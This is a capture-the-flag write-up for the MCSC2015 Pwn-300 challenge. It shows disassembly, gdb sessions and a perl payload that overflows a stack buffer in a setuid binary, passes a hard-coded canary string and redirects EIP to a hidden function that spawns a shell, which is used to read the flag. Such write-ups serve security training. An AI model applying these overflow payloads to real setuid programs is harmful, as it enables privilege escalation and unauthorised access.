#MCSC2015 writeup for Pwn-300
After establishing ssh connection, here's what are up to :<br>
```
pwn1@MCSC2015:/challenges/pwn1$ ls -lia
total 28
13238274 drwxr-xr-x 2 root   root    4096 mai   18 15:13 .
13238273 drwxr-xr-x 6 root   root    4096 mai   18 15:13 ..
13238276 -rw------- 1 pwned1 pwned1    36 mai   18 15:13 FLAG
13238275 -rws--sr-x 1 pwned1 pwned1 12376 mai   18 15:13 pwn1
```
Let's first check the security of this binary :	<br>

```
pwn1@MCSC2015:/challenges/pwn1$ /tmp/checksec.sh --file /challenges/pwn1/pwn1 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   pwn1
pwn1@MCSC2015:/challenges/pwn1$ cat /proc/sys/kernel/randomize_va_space 
2
```
checksec.sh cant be found at : https://github.com/slimm609/checksec.sh/blob/master/checksec <br>
As it appear, there's no protection exept for ASLR.<br>
Nothing but good news ... for now !<br>
Let's look to the binary more closely.<br>
```
080489fe <main>:
 80489fe:	55                   	push   %ebp
 80489ff:	89 e5                	mov    %esp,%ebp
 8048a01:	e8 01 fc ff ff       	call   8048607 <vuln>
 8048a06:	b8 00 00 00 00       	mov    $0x0,%eax
 8048a0b:	5d                   	pop    %ebp
 8048a0c:	c3                   	ret    
 8048a0d:	66 90                	xchg   %ax,%ax
 8048a0f:	90                   	nop
```
Nothing too special,a simple call to vuln function:<br>
```
08048607 <vuln>:
 8048607:	55                   	push   %ebp
 8048608:	89 e5                	mov    %esp,%ebp
 804860a:	83 ec 30             	sub    $0x30,%esp ( Buffer size 30 )
 804860d:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
 8048614:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
 804861b:	8d 45 f8             	lea    -0x8(%ebp),%eax
 804861e:	c7 00 41 70 57 6d    	movl   $0x6d577041,(%eax)
 8048624:	66 c7 40 04 37 50    	movw   $0x5037,0x4(%eax)
 804862a:	c6 40 06 50          	movb   $0x50,0x6(%eax)
 804862e:	a1 a0 a0 04 08       	mov    0x804a0a0,%eax
 8048633:	50                   	push   %eax
 8048634:	6a 64                	push   $0x64
 8048636:	8d 45 d0             	lea    -0x30(%ebp),%eax
 8048639:	50                   	push   %eax
 804863a:	e8 11 fe ff ff       	call   8048450 <fgets@plt>
 804863f:	83 c4 0c             	add    $0xc,%esp
 8048642:	68 90 8a 04 08       	push   $0x8048a90
 8048647:	8d 45 f8             	lea    -0x8(%ebp),%eax
 804864a:	50                   	push   %eax
 804864b:	e8 d0 fd ff ff       	call   8048420 <strcmp@plt>
 8048650:	83 c4 08             	add    $0x8,%esp
 8048653:	85 c0                	test   %eax,%eax
 8048655:	75 10                	jne    8048667 <vuln+0x60>
 8048657:	8b 45 04             	mov    0x4(%ebp),%eax
 804865a:	50                   	push   %eax
 804865b:	e8 5b ff ff ff       	call   80485bb <drop_eip>
 8048660:	83 c4 04             	add    $0x4,%esp
 8048663:	85 c0                	test   %eax,%eax
 8048665:	75 14                	jne    804867b <vuln+0x74>
 8048667:	68 98 8a 04 08       	push   $0x8048a98
 804866c:	e8 ff fd ff ff       	call   8048470 <puts@plt>
 8048671:	83 c4 04             	add    $0x4,%esp
 8048674:	6a 00                	push   $0x0
 8048676:	e8 25 fe ff ff       	call   80484a0 <exit@plt>
 804867b:	c9                   	leave  
 804867c:	c3                   	ret    
```
This function calls fgets, to get the user's input, then push $0x8048a90.<br>
Finally a strcmp to compare something with whatever $eax point to.<br>
let's run gdb to further inspection and break at those :<br>
Breakpoint 1 at 0x804863a fgets in vuln<br>
Breakpoint 2 at 0x804864b strcmp in vuln<br>
```
pwn1@MCSC2015:/challenges/pwn1$ gdb ./pwn1 
(gdb) break *0x804863a
Breakpoint 1 at 0x804863a
(gdb) 	
Breakpoint 2 at 0x804864b
(gdb) run
Starting program: /challenges/pwn1/pwn1 

Breakpoint 1, 0x0804863a in vuln ()
(gdb) c
Continuing.
salut

Breakpoint 2, 0x0804864b in vuln ()
(gdb) x/s $eax
0xbf896fd8:	"ApWm7PP"
```
let's start again gdb and break when strcmp is called in vuln function
```
pwn1@MCSC2015:/challenges/pwn1$ gdb ./pwn1 
(gdb) run
Starting program: /challenges/pwn1/pwn1 
   

Breakpoint 1, 0x0804864b in vuln ()
(gdb) x/s $eax
0xbf806c28:	"ApWm7PP"
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /challenges/pwn1/pwn1 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBB

Breakpoint 1, 0x0804864b in vuln ()
(gdb) x/s $eax
0xbff16cb8:	"BBB\n"
```
By running our binary with "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB" nothing happens ( canary is not overwritten)<br>
However when running with "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBB", the canary is overwritten with "BBB"<br>
Bingo !<br>
(We could find the offset using ltrace to find the offset to the canary as well ...)<br>
Let's exit gdb and check that again<br>
```
pwn1@MCSC2015:/challenges/pwn1$ perl -e 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApWm7Px\x00"' |./pwn1 
Go away..
pwn1@MCSC2015:/challenges/pwn1$ perl -e 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApWm7PP\x00"' |./pwn1 
pwn1@MCSC2015:/challenges/pwn1$ 
```
I run the program with first a false value of the canary to see if the offset is different from gdb, it can happen xD.<br>
Canary bypassed! we now just need to complete with some A's to override $eip ...<br>

```
pwn1@MCSC2015:/challenges/pwn1$ perl -e 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApWm7PP\x00AAAAAAAA"' |./pwn1 
Segmentation fault (core dumped)
```
Bingo let's run gdb again to analyse more closely<br>
```
pwn1@MCSC2015:/challenges/pwn1$ perl -e 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApWm7PP\x00AAAAAAAA"' > /tmp/input
pwn1@MCSC2015:/challenges/pwn1$ gdb ./pwn1 
(gdb) run < /tmp/input
Starting program: /challenges/pwn1/pwn1 < /tmp/input

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) 
```
Yum Yum ... we're too close to exploit that binary :)<br>
You could start by adding a lot of A's, the $eip=0x41414141, you're going to run again with the same input but less A's at the end, still eip=0x41414141, and run again to find the exact offset.<br>
However,pattern_create.rb and pattern offset.b in the metasploit framework can be handy to find the exact offset to eip without having to bruteforce it.<br>
Now, we just need to override the $eip to spawn a shell ....<br>
ASLR is on, remember ? :)<br>

Let's open our binary with objdump again and see some usefull assembly instruction.
By doing that, I found a lot of attempting function like bash,bin,ret2function,execute,shell,...
```
080486dd <shell>:
 80486dd:	55                   	push   %ebp
 80486de:	89 e5                	mov    %esp,%ebp
 80486e0:	68 a6 8a 04 08       	push   $0x8048aa6
 80486e5:	e8 46 fd ff ff       	call   8048430 <printf@plt>
 80486ea:	83 c4 04             	add    $0x4,%esp
 80486ed:	a1 a4 a0 04 08       	mov    0x804a0a4,%eax
 80486f2:	50                   	push   %eax
 80486f3:	e8 48 fd ff ff       	call   8048440 <fflush@plt>
 80486f8:	83 c4 04             	add    $0x4,%esp
 80486fb:	6a 0a                	push   $0xa
 80486fd:	e8 5e fd ff ff       	call   8048460 <sleep@plt>
 8048702:	83 c4 04             	add    $0x4,%esp
 8048705:	68 aa 8a 04 08       	push   $0x8048aaa
 804870a:	e8 61 fd ff ff       	call   8048470 <puts@plt>
 804870f:	83 c4 04             	add    $0x4,%esp
 8048712:	c9                   	leave  
 8048713:	c3                   	ret    

08048714 <buff>:
 8048714:	55                   	push   %ebp
 8048715:	89 e5                	mov    %esp,%ebp
 8048717:	68 a6 8a 04 08       	push   $0x8048aa6
 804871c:	e8 0f fd ff ff       	call   8048430 <printf@plt>
 8048721:	83 c4 04             	add    $0x4,%esp
 8048724:	a1 a4 a0 04 08       	mov    0x804a0a4,%eax
 8048729:	50                   	push   %eax
 804872a:	e8 11 fd ff ff       	call   8048440 <fflush@plt>
 804872f:	83 c4 04             	add    $0x4,%esp
 8048732:	6a 0a                	push   $0xa
 8048734:	e8 27 fd ff ff       	call   8048460 <sleep@plt>
 8048739:	83 c4 04             	add    $0x4,%esp
 804873c:	68 aa 8a 04 08       	push   $0x8048aaa
 8048741:	e8 2a fd ff ff       	call   8048470 <puts@plt>
 8048746:	83 c4 04             	add    $0x4,%esp
 8048749:	c9                   	leave  
 804874a:	c3                   	ret    

0804874b <vuln1>:
 804874b:	55                   	push   %ebp
 804874c:	89 e5                	mov    %esp,%ebp
 804874e:	68 a6 8a 04 08       	push   $0x8048aa6
 8048753:	e8 d8 fc ff ff       	call   8048430 <printf@plt>
 8048758:	83 c4 04             	add    $0x4,%esp
 804875b:	a1 a4 a0 04 08       	mov    0x804a0a4,%eax
 8048760:	50                   	push   %eax
 8048761:	e8 da fc ff ff       	call   8048440 <fflush@plt>
 8048766:	83 c4 04             	add    $0x4,%esp
 8048769:	6a 0a                	push   $0xa
 804876b:	e8 f0 fc ff ff       	call   8048460 <sleep@plt>
 8048770:	83 c4 04             	add    $0x4,%esp
 8048773:	68 aa 8a 04 08       	push   $0x8048aaa
 8048778:	e8 f3 fc ff ff       	call   8048470 <puts@plt>
 804877d:	83 c4 04             	add    $0x4,%esp
 8048780:	c9                   	leave  
 8048781:	c3                   	ret    

08048782 <login>:
 8048782:	55                   	push   %ebp
 8048783:	89 e5                	mov    %esp,%ebp
 8048785:	68 a6 8a 04 08       	push   $0x8048aa6
 804878a:	e8 a1 fc ff ff       	call   8048430 <printf@plt>
 804878f:	83 c4 04             	add    $0x4,%esp
 8048792:	a1 a4 a0 04 08       	mov    0x804a0a4,%eax
 8048797:	50                   	push   %eax
 8048798:	e8 a3 fc ff ff       	call   8048440 <fflush@plt>
 804879d:	83 c4 04             	add    $0x4,%esp
 80487a0:	6a 0a                	push   $0xa
 80487a2:	e8 b9 fc ff ff       	call   8048460 <sleep@plt>
 80487a7:	83 c4 04             	add    $0x4,%esp
 80487aa:	68 aa 8a 04 08       	push   $0x8048aaa
 80487af:	e8 bc fc ff ff       	call   8048470 <puts@plt>
 80487b4:	83 c4 04             	add    $0x4,%esp
 80487b7:	c9                   	leave  
 80487b8:	c3                   	ret    

080487b9 <password>:
 80487b9:	55                   	push   %ebp
 80487ba:	89 e5                	mov    %esp,%ebp
 80487bc:	68 a6 8a 04 08       	push   $0x8048aa6
 80487c1:	e8 6a fc ff ff       	call   8048430 <printf@plt>
 80487c6:	83 c4 04             	add    $0x4,%esp
 80487c9:	a1 a4 a0 04 08       	mov    0x804a0a4,%eax
 80487ce:	50                   	push   %eax
 80487cf:	e8 6c fc ff ff       	call   8048440 <fflush@plt>
 80487d4:	83 c4 04             	add    $0x4,%esp
 80487d7:	6a 0a                	push   $0xa
 80487d9:	e8 82 fc ff ff       	call   8048460 <sleep@plt>
 80487de:	83 c4 04             	add    $0x4,%esp
 80487e1:	68 aa 8a 04 08       	push   $0x8048aaa
 80487e6:	e8 85 fc ff ff       	call   8048470 <puts@plt>
 80487eb:	83 c4 04             	add    $0x4,%esp
 80487ee:	c9                   	leave  
 80487ef:	c3                   	ret    

080487f0 <attack>:
 80487f0:	55                   	push   %ebp
 80487f1:	89 e5                	mov    %esp,%ebp
 80487f3:	68 a6 8a 04 08       	push   $0x8048aa6
 80487f8:	e8 33 fc ff ff       	call   8048430 <printf@plt>
 80487fd:	83 c4 04             	add    $0x4,%esp
 8048800:	a1 a4 a0 04 08       	mov    0x804a0a4,%eax
 8048805:	50                   	push   %eax
 8048806:	e8 35 fc ff ff       	call   8048440 <fflush@plt>
 804880b:	83 c4 04             	add    $0x4,%esp
 804880e:	6a 0a                	push   $0xa
 8048810:	e8 4b fc ff ff       	call   8048460 <sleep@plt>
 8048815:	83 c4 04             	add    $0x4,%esp
 8048818:	68 aa 8a 04 08       	push   $0x8048aaa
 804881d:	e8 4e fc ff ff       	call   8048470 <puts@plt>
 8048822:	83 c4 04             	add    $0x4,%esp
 8048825:	c9                   	leave  
 8048826:	c3                   	ret    

08048827 <pwn100>:
 8048827:	55                   	push   %ebp
 8048828:	89 e5                	mov    %esp,%ebp
 804882a:	68 a6 8a 04 08       	push   $0x8048aa6
 804882f:	e8 fc fb ff ff       	call   8048430 <printf@plt>
 8048834:	83 c4 04             	add    $0x4,%esp
 8048837:	a1 a4 a0 04 08       	mov    0x804a0a4,%eax
 804883c:	50                   	push   %eax
 804883d:	e8 fe fb ff ff       	call   8048440 <fflush@plt>
 8048842:	83 c4 04             	add    $0x4,%esp
 8048845:	6a 0a                	push   $0xa
 8048847:	e8 14 fc ff ff       	call   8048460 <sleep@plt>
 804884c:	83 c4 04             	add    $0x4,%esp
 804884f:	68 aa 8a 04 08       	push   $0x8048aaa
 8048854:	e8 17 fc ff ff       	call   8048470 <puts@plt>
 8048859:	83 c4 04             	add    $0x4,%esp
 804885c:	c9                   	leave  
 804885d:	c3                   	ret    

0804885e <mcsc>:
 804885e:	55                   	push   %ebp
 804885f:	89 e5                	mov    %esp,%ebp
 8048861:	68 a6 8a 04 08       	push   $0x8048aa6
 8048866:	e8 c5 fb ff ff       	call   8048430 <printf@plt>
 804886b:	83 c4 04             	add    $0x4,%esp
 804886e:	a1 a4 a0 04 08       	mov    0x804a0a4,%eax
 8048873:	50                   	push   %eax
 8048874:	e8 c7 fb ff ff       	call   8048440 <fflush@plt>
 8048879:	83 c4 04             	add    $0x4,%esp
 804887c:	6a 0a                	push   $0xa
 804887e:	e8 dd fb ff ff       	call   8048460 <sleep@plt>
 8048883:	83 c4 04             	add    $0x4,%esp
 8048886:	68 aa 8a 04 08       	push   $0x8048aaa
 804888b:	e8 e0 fb ff ff       	call   8048470 <puts@plt>
 8048890:	83 c4 04             	add    $0x4,%esp
 8048893:	c9                   	leave  
 8048894:	c3                   	ret    

08048895 <dgeeky>:
 8048895:	55                   	push   %ebp
 8048896:	89 e5                	mov    %esp,%ebp
 8048898:	68 a6 8a 04 08       	push   $0x8048aa6
 804889d:	e8 8e fb ff ff       	call   8048430 <printf@plt>
 80488a2:	83 c4 04             	add    $0x4,%esp
 80488a5:	a1 a4 a0 04 08       	mov    0x804a0a4,%eax
 80488aa:	50                   	push   %eax
 80488ab:	e8 90 fb ff ff       	call   8048440 <fflush@plt>
 80488b0:	83 c4 04             	add    $0x4,%esp
 80488b3:	6a 0a                	push   $0xa
 80488b5:	e8 a6 fb ff ff       	call   8048460 <sleep@plt>
 80488ba:	83 c4 04             	add    $0x4,%esp
 80488bd:	68 aa 8a 04 08       	push   $0x8048aaa
 80488c2:	e8 a9 fb ff ff       	call   8048470 <puts@plt>
 80488c7:	83 c4 04             	add    $0x4,%esp
 80488ca:	c9                   	leave  
 80488cb:	c3                   	ret    

080488cc <stack>:
 80488cc:	55                   	push   %ebp
 80488cd:	89 e5                	mov    %esp,%ebp
 80488cf:	68 a6 8a 04 08       	push   $0x8048aa6
 80488d4:	e8 57 fb ff ff       	call   8048430 <printf@plt>
 80488d9:	83 c4 04             	add    $0x4,%esp
 80488dc:	a1 a4 a0 04 08       	mov    0x804a0a4,%eax
 80488e1:	50                   	push   %eax
 80488e2:	e8 59 fb ff ff       	call   8048440 <fflush@plt>
 80488e7:	83 c4 04             	add    $0x4,%esp
 80488ea:	6a 0a                	push   $0xa
 80488ec:	e8 6f fb ff ff       	call   8048460 <sleep@plt>
 80488f1:	83 c4 04             	add    $0x4,%esp
 80488f4:	68 aa 8a 04 08       	push   $0x8048aaa
 80488f9:	e8 72 fb ff ff       	call   8048470 <puts@plt>
 80488fe:	83 c4 04             	add    $0x4,%esp
 8048901:	c9                   	leave  
 8048902:	c3                   	ret    

08048903 <ret2function>:
 8048903:	55                   	push   %ebp
 8048904:	89 e5                	mov    %esp,%ebp
 8048906:	68 a6 8a 04 08       	push   $0x8048aa6
 804890b:	e8 20 fb ff ff       	call   8048430 <printf@plt>
 8048910:	83 c4 04             	add    $0x4,%esp
 8048913:	a1 a4 a0 04 08       	mov    0x804a0a4,%eax
 8048918:	50                   	push   %eax
 8048919:	e8 22 fb ff ff       	call   8048440 <fflush@plt>
 804891e:	83 c4 04             	add    $0x4,%esp
 8048921:	6a 0a                	push   $0xa
 8048923:	e8 38 fb ff ff       	call   8048460 <sleep@plt>
 8048928:	83 c4 04             	add    $0x4,%esp
 804892b:	68 aa 8a 04 08       	push   $0x8048aaa
 8048930:	e8 3b fb ff ff       	call   8048470 <puts@plt>
 8048935:	83 c4 04             	add    $0x4,%esp
 8048938:	c9                   	leave  
 8048939:	c3                   	ret    

0804893a <execute>:
 804893a:	55                   	push   %ebp
 804893b:	89 e5                	mov    %esp,%ebp
 804893d:	68 a6 8a 04 08       	push   $0x8048aa6
 8048942:	e8 e9 fa ff ff       	call   8048430 <printf@plt>
 8048947:	83 c4 04             	add    $0x4,%esp
 804894a:	a1 a4 a0 04 08       	mov    0x804a0a4,%eax
 804894f:	50                   	push   %eax
 8048950:	e8 eb fa ff ff       	call   8048440 <fflush@plt>
 8048955:	83 c4 04             	add    $0x4,%esp
 8048958:	6a 0a                	push   $0xa
 804895a:	e8 01 fb ff ff       	call   8048460 <sleep@plt>
 804895f:	83 c4 04             	add    $0x4,%esp
 8048962:	68 aa 8a 04 08       	push   $0x8048aaa
 8048967:	e8 04 fb ff ff       	call   8048470 <puts@plt>
 804896c:	83 c4 04             	add    $0x4,%esp
 804896f:	c9                   	leave  
 8048970:	c3                   	ret    

08048971 <bash>:
 8048971:	55                   	push   %ebp
 8048972:	89 e5                	mov    %esp,%ebp
 8048974:	68 a6 8a 04 08       	push   $0x8048aa6
 8048979:	e8 b2 fa ff ff       	call   8048430 <printf@plt>
 804897e:	83 c4 04             	add    $0x4,%esp
 8048981:	a1 a4 a0 04 08       	mov    0x804a0a4,%eax
 8048986:	50                   	push   %eax
 8048987:	e8 b4 fa ff ff       	call   8048440 <fflush@plt>
 804898c:	83 c4 04             	add    $0x4,%esp
 804898f:	6a 0a                	push   $0xa
 8048991:	e8 ca fa ff ff       	call   8048460 <sleep@plt>
 8048996:	83 c4 04             	add    $0x4,%esp
 8048999:	68 aa 8a 04 08       	push   $0x8048aaa
 804899e:	e8 cd fa ff ff       	call   8048470 <puts@plt>
 80489a3:	83 c4 04             	add    $0x4,%esp
 80489a6:	c9                   	leave  
 80489a7:	c3                   	ret    

080489a8 <bin>:
 80489a8:	55                   	push   %ebp
 80489a9:	89 e5                	mov    %esp,%ebp
 80489ab:	68 a6 8a 04 08       	push   $0x8048aa6
 80489b0:	e8 7b fa ff ff       	call   8048430 <printf@plt>
 80489b5:	83 c4 04             	add    $0x4,%esp
 80489b8:	a1 a4 a0 04 08       	mov    0x804a0a4,%eax
 80489bd:	50                   	push   %eax
 80489be:	e8 7d fa ff ff       	call   8048440 <fflush@plt>
 80489c3:	83 c4 04             	add    $0x4,%esp
 80489c6:	6a 0a                	push   $0xa
 80489c8:	e8 93 fa ff ff       	call   8048460 <sleep@plt>
 80489cd:	83 c4 04             	add    $0x4,%esp
 80489d0:	68 aa 8a 04 08       	push   $0x8048aaa
 80489d5:	e8 96 fa ff ff       	call   8048470 <puts@plt>
 80489da:	83 c4 04             	add    $0x4,%esp
 80489dd:	c9                   	leave  
 80489de:	c3                   	ret    
```
Like a poor guy who didn't want to build his ROP chain, I tried them all, and then again, like always, it was just a troll ... :'(<br>
As an illustration : testing shell function<br>
```
pwn1@MCSC2015:/challenges/pwn1$ gdb ./pwn1 
(gdb) break main
Breakpoint 1 at 0x8048a01
(gdb) run
Starting program: /challenges/pwn1/pwn1 

Breakpoint 1, 0x08048a01 in main ()
(gdb) set $eip=080486dd
Invalid number "080486dd".
(gdb) set $eip=0x080486dd
(gdb) c
Continuing.

# Troll of the day :XD

Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()
(gdb) 
```
Haha .. too funny .... !<br>
Having no desire to test all those function, I openned the binary and grep system ...<br>
```
pwn1@MCSC2015:/challenges/pwn1$ objdump -d ./pwn1 |grep system
08048480 <system@plt>:
 80489f4:	e8 87 fa ff ff       	call   8048480 <system@plt>
```
There's one call to system, I looked in the assembly code and found that this system call is inside a function
```
080489df <__dest__main__pointer__>:
 80489df:	55                   	push   %ebp
 80489e0:	89 e5                	mov    %esp,%ebp
 80489e2:	68 bf 8a 04 08       	push   $0x8048abf
 80489e7:	e8 84 fa ff ff       	call   8048470 <puts@plt>
 80489ec:	83 c4 04             	add    $0x4,%esp
 80489ef:	68 c7 8a 04 08       	push   $0x8048ac7
 80489f4:	e8 87 fa ff ff       	call   8048480 <system@plt>
 80489f9:	83 c4 04             	add    $0x4,%esp
 80489fc:	c9                   	leave  
 80489fd:	c3                   	ret  
```
```
despairing, I looked inside gdb to see what this function do ...
pwn1@MCSC2015:/challenges/pwn1$ gdb ./pwn1 
(gdb) break main
Breakpoint 1 at 0x8048a01
(gdb) run
Starting program: /challenges/pwn1/pwn1 

Breakpoint 1, 0x08048a01 in main ()
(gdb) set $eip=0x080489df
(gdb) c
Continuing.
You win
$ 
```
Hahahaha, less work to do, there's no need to build a ROP chain, all what we have to do is to jump to this function.<br>
```
pwn1@MCSC2015:/challenges/pwn0$ cat FLAG
cat: FLAG: Permission denied
pwn1@MCSC2015:/challenges/pwn1$ perl -e 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApWm7PP\x00AAAA\xdf\x89\x04\x08"' > /tmp/input
pwn1@MCSC2015:/challenges/pwn1$ cat /tmp/input -|./pwn1 whoami 
You win
cat FLAG
Fl4G{You_W!n_In_Th!s_Chall5_But...}
```
Bingo !<br>
